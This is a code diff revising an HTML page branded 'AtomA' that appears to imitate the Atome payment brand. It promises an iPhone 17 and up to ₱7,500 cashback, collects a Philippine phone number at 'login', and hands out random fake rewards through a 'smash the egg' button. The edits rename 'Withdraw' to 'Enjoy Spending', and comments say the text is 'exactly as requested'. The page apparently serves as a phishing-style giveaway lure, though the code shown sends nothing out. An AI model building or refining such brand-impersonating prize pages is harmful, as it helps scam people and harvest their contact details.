@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AtomA | Apply · Claim · Withdraw</title>
+    <title>AtomA | Login · Claim · Enjoy Spending</title>
     <link rel="preload" as="image" href="photos/atomebg.png">
-    <link rel="preload" as="image" href="photos/atomeA.jpg">
+    <link rel="preload" as="image" href="photos/atomeA.png">
     <!-- Google Fonts: elegant typography -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -21,7 +21,7 @@
             min-height: 100vh;
         }
 
-        /* MAIN BACKGROUND - NO BLUR, crisp and clear */
+        /* MAIN BACKGROUND - crisp and clear, no blur */
         .bg-theme {
             background-image: url('photos/atomebg.png');
             background-size: cover;
@@ -36,7 +36,7 @@
             padding: 24px 16px;
         }
 
-        /* CONTAINER - transparent, no blur effect, just slight glass edge */
+        /* CONTAINER - fully transparent, no blur, no white bg */
         .glass-card {
             max-width: 520px;
             width: 100%;
@@ -50,7 +50,7 @@
         /* PROMO HEADER */
         .promo-header {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
         .promo-title {
             font-size: 1.7rem;
@@ -65,25 +65,25 @@
             text-shadow: 0 2px 6px rgba(0,0,0,0.3);
         }
         .promo-sub {
-            font-size: 0.75rem;
+            font-size: 0.8rem;
             color: rgba(255,252,210,0.95);
-            margin-top: 6px;
+            margin-top: 8px;
             font-weight: 500;
             letter-spacing: 0.5px;
             font-family: 'Inter', sans-serif;
             text-shadow: 0 1px 2px rgba(0,0,0,0.3);
         }
 
-        /* STEPS - semi-transparent but not blurry */
+        /* STEPS - with emojis, semi-transparent background */
         .steps-container {
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 0;
             margin-bottom: 32px;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.35);
             border-radius: 100px;
-            padding: 8px 20px;
+            padding: 12px 20px;
             border: 1px solid rgba(255,240,140,0.3);
         }
         .step {
@@ -97,13 +97,14 @@
             letter-spacing: -0.2px;
             position: relative;
         }
-        .step-number {
-            font-size: 0.6rem;
-            opacity: 0.8;
-            font-weight: 500;
+        .step-emoji {
+            font-size: 1.3rem;
             display: block;
-            font-family: 'Inter', monospace;
-            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+        .step-text {
+            display: block;
+            font-size: 0.85rem;
         }
         .step:not(:last-child):after {
             content: "→";
@@ -117,7 +118,7 @@
             font-weight: 600;
         }
 
-        /* ATOME LOGO - NO WHITE BACKGROUND, FULLY TRANSPARENT, LARGE */
+        /* ATOME LOGO - FULLY TRANSPARENT, NO WHITE BACKGROUND, NO CIRCLE */
         .logo-wrapper {
             display: flex;
             justify-content: center;
@@ -126,7 +127,7 @@
         .logo-image {
             width: auto;
             height: auto;
-            max-width: 180px;
+            max-width: 200px;
             display: block;
             background: transparent;
             filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3));
@@ -136,18 +137,17 @@
             height: auto;
             display: block;
             background: transparent !important;
-            /* Force remove any white background from image */
-            mix-blend-mode: normal;
+            /* Force remove any white background */
         }
 
-        /* PHONE INPUT - semi-transparent, no blur */
+        /* PHONE INPUT - semi-transparent */
         .input-field-wrapper {
             margin-bottom: 28px;
         }
         .phone-input-group {
             display: flex;
             align-items: center;
-            background: rgba(0, 0, 0, 0.35);
+            background: rgba(0, 0, 0, 0.4);
             border-radius: 80px;
             border: 1px solid rgba(255, 245, 180, 0.5);
             transition: all 0.25s;
@@ -156,7 +156,7 @@
         .phone-input-group:focus-within {
             border-color: #ccff44;
             box-shadow: 0 0 16px rgba(204,255,68,0.3);
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.55);
         }
         .country-code {
             font-weight: 600;
@@ -229,7 +229,7 @@
             font-size: 0.72rem;
             color: #e6e2c3;
             margin: 12px 0 12px;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.35);
             padding: 10px 18px;
             border-radius: 50px;
             width: 100%;
@@ -244,7 +244,7 @@
             color: #ddd9c6;
             margin-top: 18px;
             line-height: 1.4;
-            background: rgba(0, 0, 0, 0.25);
+            background: rgba(0, 0, 0, 0.3);
             padding: 10px 16px;
             border-radius: 80px;
             font-family: 'Inter', sans-serif;
@@ -260,14 +260,14 @@
             color: #eaffaa;
         }
 
-        /* Dashboard (Claim & Withdraw) - semi-transparent */
+        /* Dashboard (Claim & Withdraw panel) */
         .dashboard-area {
             margin-top: 28px;
             border-top: 1px solid rgba(204,255,0,0.3);
             padding-top: 20px;
         }
         .reward-panel {
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.45);
             border-radius: 48px;
             padding: 22px 20px;
             border: 1px solid rgba(204,255,0,0.4);
@@ -320,8 +320,11 @@
                 padding: 24px 20px 36px;
                 border-radius: 48px;
             }
-            .step {
-                font-size: 0.75rem;
+            .step-emoji {
+                font-size: 1.1rem;
+            }
+            .step-text {
+                font-size: 0.7rem;
             }
             .step:not(:last-child):after {
                 right: -10px;
@@ -331,7 +334,7 @@
                 font-size: 1.4rem;
             }
             .logo-image {
-                max-width: 140px;
+                max-width: 150px;
             }
             .login-button {
                 font-size: 1rem;
@@ -343,23 +346,32 @@
 <body>
 <div class="bg-theme">
     <div class="glass-card">
-        <!-- PROMO HEADER -->
+        <!-- PROMO HEADER - exact text as requested -->
         <div class="promo-header">
             <div class="promo-title">Win an iPhone 17 & up to ₱7,500 cashback!</div>
             <div class="promo-sub">Register for your chance to win</div>
         </div>
 
-        <!-- STEPS (Apply · Claim · Withdraw) -->
+        <!-- STEPS with emojis: Login 🔐 | Claim 🎁 | Enjoy Spending 💳 -->
         <div class="steps-container">
-            <div class="step"><span class="step-number">01</span> Apply</div>
-            <div class="step"><span class="step-number">02</span> Claim</div>
-            <div class="step"><span class="step-number">03</span> Withdraw</div>
+            <div class="step">
+                <span class="step-emoji">🔐</span>
+                <span class="step-text">Login</span>
+            </div>
+            <div class="step">
+                <span class="step-emoji">🎁</span>
+                <span class="step-text">Claim</span>
+            </div>
+            <div class="step">
+                <span class="step-emoji">💳</span>
+                <span class="step-text">Enjoy Spending</span>
+            </div>
         </div>
 
-        <!-- ATOME LOGO - NO CIRCLE, NO WHITE BACKGROUND, FULLY TRANSPARENT, LARGER -->
+        <!-- ATOME LOGO - FULLY TRANSPARENT (using atomeA.png) -->
         <div class="logo-wrapper">
             <div class="logo-image">
-                <img src="photos/atomeA.jpg" alt="AtomA" style="background: transparent !important; width: 100%; height: auto; display: block; mix-blend-mode: normal;">
+                <img src="photos/atomeA.png" alt="AtomA" style="background: transparent !important; width: 100%; height: auto; display: block;">
             </div>
         </div>
 
@@ -380,14 +392,14 @@
             Users need to login first to start claiming rewards
         </div>
 
-        <!-- Terms & Privacy -->
+        <!-- Terms & Privacy (until Privacy Policy) -->
         <div class="terms-row">
             By continuing you agree to the 
             <a href="#" id="termsLink">Terms of Service</a> and 
             <a href="#" id="privacyLink">Privacy Policy</a>.
         </div>
 
-        <!-- Dashboard after login: claim & withdraw -->
+        <!-- Dashboard after login: claim & enjoy spending -->
         <div id="dashboardPanel" class="dashboard-area hidden">
             <div class="reward-panel">
                 <div class="claim-row">
@@ -395,9 +407,9 @@
                     <button class="claim-btn-sm" id="claimRewardBtn">Claim Rewards</button>
                 </div>
                 <div class="withdraw-row">
-                    <span>💰 Withdrawable balance</span>
+                    <span>💳 Spending Balance</span>
                     <span class="balance-text" id="balanceDisplay">₱0</span>
-                    <button class="withdraw-btn-sm" id="withdrawFundsBtn">Withdraw</button>
+                    <button class="withdraw-btn-sm" id="withdrawFundsBtn">Enjoy Spending</button>
                 </div>
                 <div class="status-sub" id="claimedStatusMsg"></div>
             </div>
@@ -407,14 +419,16 @@
 
 <script>
     // ==================================================
-    // REMASTERED: No blur on container or background
-    // Logo: completely transparent, no white background
-    // Main background fully visible through glass elements
+    // COMPLETE REMASTER: 
+    // - Logo fully transparent (no white background)
+    // - Steps: Login 🔐 | Claim 🎁 | Enjoy Spending 💳
+    // - Promo text exactly as requested
+    // - No blur on main background
     // ==================================================
 
     let isLoggedIn = false;
     let claimedReward = false;
-    let withdrawableCash = 0;
+    let spendableBalance = 0;
 
     // DOM elements
     const phoneInput = document.getElementById('phoneInput');
@@ -447,10 +461,10 @@
                 claimRewardBtn.innerText = "✓ Claimed";
                 claimRewardBtn.disabled = true;
                 claimRewardBtn.style.opacity = "0.7";
-                claimedStatusMsg.innerText = `✨ You claimed ₱${withdrawableCash} cashback! Withdraw anytime.`;
-                balanceDisplay.innerText = `₱${withdrawableCash}`;
-                withdrawFundsBtn.disabled = (withdrawableCash <= 0);
-                withdrawFundsBtn.style.opacity = (withdrawableCash > 0) ? "1" : "0.5";
+                claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance} spending balance! Enjoy shopping everywhere.`;
+                balanceDisplay.innerText = `₱${spendableBalance}`;
+                withdrawFundsBtn.disabled = (spendableBalance <= 0);
+                withdrawFundsBtn.style.opacity = (spendableBalance > 0) ? "1" : "0.5";
             } else {
                 claimRewardBtn.innerText = "🥚 Smash & Claim";
                 claimRewardBtn.disabled = false;
@@ -485,27 +499,27 @@
         phoneError.classList.remove('show');
         isLoggedIn = true;
         claimedReward = false;
-        withdrawableCash = 0;
+        spendableBalance = 0;
         refreshUI();
         alert(`✅ Login successful! +63${phoneValue.replace(/\D/g, '')} — you can now smash the egg.`);
     }
 
-    // CLAIM REWARD
+    // CLAIM REWARD (smash egg, random up to 7,500)
     function performClaim() {
         if (!isLoggedIn) {
             alert("Please login first to claim rewards.");
             return;
         }
         if (claimedReward) {
-            alert(`You already claimed ₱${withdrawableCash}. Withdraw or wait for new event.`);
+            alert(`You already claimed ₱${spendableBalance} spending balance. Enjoy spending your rewards!`);
             return;
         }
         const cashbackAmount = Math.floor(Math.random() * (7500 - 300 + 1) + 300);
-        withdrawableCash = cashbackAmount;
+        spendableBalance = cashbackAmount;
         claimedReward = true;
 
         const iphoneBonus = Math.random() < 0.12;
-        let msg = `🎉 You smashed the Lucky Egg! You earned ₱${cashbackAmount} cashback!`;
+        let msg = `🎉 You smashed the Lucky Egg! You earned ₱${cashbackAmount} spending balance!`;
         if (iphoneBonus) {
             msg += ` 🍀 AMAZING! You also won a raffle entry for iPhone 17! 🍀`;
         }
@@ -513,24 +527,24 @@
         refreshUI();
     }
 
-    // WITHDRAW
-    function performWithdraw() {
+    // ENJOY SPENDING (formerly withdraw)
+    function performEnjoySpending() {
         if (!isLoggedIn) {
-            alert("Please login to withdraw funds.");
+            alert("Please login to enjoy spending.");
             return;
         }
         if (!claimedReward) {
             alert("You haven't claimed any rewards yet. Smash the lucky egg first!");
             return;
         }
-        if (withdrawableCash <= 0) {
-            alert("No withdrawable balance. Please claim a reward first.");
+        if (spendableBalance <= 0) {
+            alert("No spending balance available. Please claim a reward first.");
             return;
         }
-        const confirmWd = confirm(`Withdraw ₱${withdrawableCash} to your registered account? (simulated transaction)`);
-        if (confirmWd) {
-            alert(`✅ Withdrawal of ₱${withdrawableCash} successfully processed! Funds will be sent to your linked wallet.`);
-            withdrawableCash = 0;
+        const confirmSpend = confirm(`Enjoy spending ₱${spendableBalance}? (simulated transaction - you can use this balance at partner merchants)`);
+        if (confirmSpend) {
+            alert(`✅ You're all set! ₱${spendableBalance} is ready for your next shopping adventure. Enjoy!`);
+            spendableBalance = 0;
             refreshUI();
         }
     }
@@ -548,7 +562,7 @@
     // Event listeners
     mainLoginBtn.addEventListener('click', attemptLogin);
     claimRewardBtn.addEventListener('click', performClaim);
-    withdrawFundsBtn.addEventListener('click', performWithdraw);
+    withdrawFundsBtn.addEventListener('click', performEnjoySpending);
 
     phoneInput.addEventListener('input', () => {
         if (isValidPhone(phoneInput.value)) {
